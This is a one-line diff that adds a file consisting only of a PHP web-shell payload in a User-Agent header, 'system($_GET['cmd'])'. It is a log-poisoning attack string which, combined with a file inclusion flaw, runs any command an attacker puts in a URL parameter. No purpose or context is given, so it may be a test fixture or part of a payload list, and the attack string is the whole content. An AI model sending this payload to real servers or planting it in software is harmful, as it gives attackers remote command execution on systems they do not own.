@@ -1,0 +1,1 @@
+User-Agent: <?php system($_GET['cmd']); ?>
